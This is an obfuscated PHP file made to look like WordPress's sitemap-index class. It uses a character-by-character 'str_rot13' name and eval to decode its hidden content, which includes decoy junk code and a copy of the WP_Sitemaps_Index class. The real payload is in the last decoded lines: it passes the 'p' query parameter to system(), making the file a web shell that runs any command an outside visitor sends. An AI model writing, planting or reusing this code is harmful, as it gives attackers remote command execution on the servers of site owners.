<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fvgrzncf: JC_Fvgrzncf_Vaqrk pynff.
 *
 * Trarengrf gur fvgrznc vaqrk.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrzncf
 * @fvapr 5.5.0
 */

/**
 * Pynff JC_Fvgrzncf_Vaqrk.
 * Ohvyqf gur fvgrznc vaqrk cntr gung yvfgf gur yvaxf gb nyy bs gur fvgrzncf.
 *
 * @fvapr 5.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fvgrzncf_Vaqrk {
	/**
	 * Gur znva ertvfgel bs fhccbegrq fvgrzncf.
	 *
	 * @fvapr 5.5.0
	 * @ine JC_Fvgrzncf_Ertvfgel
	 */
	cebgrpgrq $ertvfgel;

	/**
	 * Znkvzhz ahzore bs fvgrzncf gb vapyhqr va na vaqrk.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine vag Znkvzhz ahzore bs fvgrzncf.
	 */
	cevingr $znk_fvgrzncf = 50000;

	/**
	 * JC_Fvgrzncf_Vaqrk pbafgehpgbe.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_Fvgrzncf_Ertvfgel $ertvfgel Fvgrznc cebivqre ertvfgel.
	 */
	choyvp shapgvba __pbafgehpg( JC_Fvgrzncf_Ertvfgel $ertvfgel ) {
		$guvf->ertvfgel = $ertvfgel;
	}

	/**
	 * Trgf n fvgrznc yvfg sbe gur vaqrk.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl[] Neenl bs nyy fvgrzncf.
	 */
	choyvp shapgvba trg_fvgrznc_yvfg() {
		$fvgrzncf = neenl();

		$cebivqref = $guvf->ertvfgel->trg_cebivqref();
		/* @ine JC_Fvgrzncf_Cebivqre $cebivqre */
		sbernpu ( $cebivqref nf $anzr => $cebivqre ) {
			$fvgrznc_ragevrf = $cebivqre->trg_fvgrznc_ragevrf();

			// Cerirag vffhrf jvgu neenl_chfu naq rzcgl neenlf ba CUC < 7.3.
			vs ( ! $fvgrznc_ragevrf ) {
				pbagvahr;
			}

			// Hfvat neenl_chfu vf zber rssvpvrag guna neenl_zretr va n ybbc.
			neenl_chfu( $fvgrzncf, ...$fvgrznc_ragevrf );
			vs ( pbhag( $fvgrzncf ) >= $guvf->znk_fvgrzncf ) {
				oernx;
			}
		}

		erghea neenl_fyvpr( $fvgrzncf, 0, $guvf->znk_fvgrzncf, gehr );
	}

	/**
	 * Ohvyqf gur HEY sbe gur fvgrznc vaqrk.
	 *
	 * @fvapr 5.5.0
	 *
	 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
	 *
	 * @erghea fgevat Gur fvgrznc vaqrk HEY.
	 */
	choyvp shapgvba trg_vaqrk_hey() {
		tybony $jc_erjevgr;

		vs ( ! $jc_erjevgr->hfvat_creznyvaxf() ) {
			erghea ubzr_hey( '/?fvgrznc=vaqrk' );
		}

		erghea ubzr_hey( '/jc-fvgrznc.kzy' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>